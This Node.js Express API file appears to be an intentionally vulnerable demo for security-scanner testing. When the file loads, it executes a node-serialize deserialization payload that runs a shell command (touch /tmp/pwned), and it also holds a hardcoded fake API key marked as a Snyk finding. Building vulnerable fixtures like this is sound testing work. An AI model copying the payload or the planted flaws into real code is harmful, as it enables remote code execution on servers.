const express = require('express');
const serialize = require('node-serialize');

const evilPayload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'touch /tmp/pwned\', function(error, stdout, stderr){console.log(stdout)});}"}';
console.log("Demonstrating insecure deserialization. This is a critical vulnerability!");
serialize.unserialize(evilPayload);
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

// Snyk Code finding: Hardcoded secret
const HARDCODED_API_KEY = "sk_test_12345abcdefg_this_is_a_fake_key";
const RISK_SERVICE_URL = 'http://localhost:8000/calculate';

console.log(`Using hardcoded key starting with: ${HARDCODED_API_KEY.substring(0, 10)}...`);

app.post('/prioritize', async (req, res) => {
    const { title, description } = req.body;

    if (!title || !description) {
        return res.status(400).json({ error: 'Title and description are required.' });
    }

    try {
        const response = await axios.post(RISK_SERVICE_URL, {
            title,
            description,
        });
        res.json(response.data);
    } catch (error) {
        console.error("Error calling risk-service:", error.message);
        res.status(500).json({ error: 'Failed to calculate risk score.' });
    }
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`API server running on port ${PORT}`);
});